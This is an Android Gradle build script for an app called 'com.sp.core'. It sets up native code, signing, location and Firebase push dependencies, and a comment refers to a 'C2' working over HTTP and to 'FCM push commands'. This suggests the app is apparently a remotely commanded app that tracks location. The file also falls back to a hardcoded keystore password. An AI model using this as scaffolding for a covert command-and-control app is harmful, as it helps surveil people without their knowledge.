plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}

// Set -PspNoNative=true to skip the NDK/CMake step (useful on hosts without
// the Android NDK, e.g. arm64 CI containers). The native library is required
// at runtime, so release builds must keep it enabled.
val spNoNative = (project.findProperty("spNoNative") as String?)?.toBoolean() ?: false

android {
    namespace = "com.sp.core"
    compileSdk = 35
    if (!spNoNative) ndkVersion = "27.0.12077973"

    defaultConfig {
        applicationId = "com.sp.core"
        minSdk = 26
        targetSdk = 35
        versionCode = 7
        versionName = "1.1.6"
        if (!spNoNative) {
            externalNativeBuild {
                cmake {
                    cppFlags += "-std=c++17"
                    arguments += "-DANDROID_STL=c++_shared"
                }
            }
            ndk { abiFilters += listOf("arm64-v8a", "armeabi-v7a") }
        }
    }

    if (!spNoNative) {
        externalNativeBuild {
            cmake { path = file("src/main/cpp/CMakeLists.txt") }
        }
    }

    signingConfigs {
        create("release") {
            // Only usable when the keystore is present; otherwise the release
            // build falls back to the debug signature (see buildTypes below).
            val ks = file("release.keystore")
            if (ks.exists()) {
                storeFile = ks
                storePassword = System.getenv("SP_STORE_PASS") ?: "change_me_store"
                keyAlias = "sp"
                keyPassword = System.getenv("SP_KEY_PASS")
                    ?: System.getenv("SP_STORE_PASS")
                    ?: "change_me_store"
            }
        }
    }

    buildTypes {
        release {
            isMinifyEnabled = true
            isShrinkResources = true
            proguardFiles(
                getDefaultProguardFile("proguard-android-optimize.txt"),
                "proguard-rules.pro"
            )
            signingConfig = if (file("release.keystore").exists())
                signingConfigs.getByName("release")
            else
                signingConfigs.getByName("debug")
        }
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }

    packaging {
        resources.excludes += setOf("META-INF/*.kotlin_module")
        jniLibs {
            // android:extractNativeLibs="true" in the manifest
            useLegacyPackaging = true
        }
    }

    buildFeatures { buildConfig = true }

    lint {
        // lintVital adds several minutes to every release build and does not
        // block the build here.
        checkReleaseBuilds = false
        abortOnError = false
    }
}

// The Google Services plugin is only applied when a real google-services.json
// is present. Without it the app still builds and the C2 works over HTTP;
// FCM push commands need the Firebase project (see google-services.json.example).
if (file("google-services.json").exists()) {
    apply(plugin = "com.google.gms.google-services")
}

dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.gms:play-services-location:21.3.0")
    implementation("com.google.firebase:firebase-messaging:24.1.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.9.0")
    implementation("androidx.work:work-runtime-ktx:2.9.0")
    implementation("androidx.room:room-runtime:2.6.1")
    implementation("androidx.room:room-ktx:2.6.1")
    annotationProcessor("androidx.room:room-compiler:2.6.1")
}
